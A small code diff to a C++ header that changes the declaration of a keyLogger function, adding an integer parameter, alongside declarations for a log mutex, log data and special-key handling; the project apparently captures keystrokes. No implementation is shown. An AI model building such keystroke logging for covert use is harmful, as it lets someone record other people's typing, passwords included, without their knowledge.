@@ -9,8 +9,7 @@ extern std::mutex logMutex;
 extern std::string logData;
 
 namespace Services {
-    bool keyLogger(const std::string &saveFile);
-
+    bool keyLogger(const std::string &saveFile, int T);
     std::vector<std::string> keyLogger(Command command);
 }
 bool SpecialKeys(int S_Key);
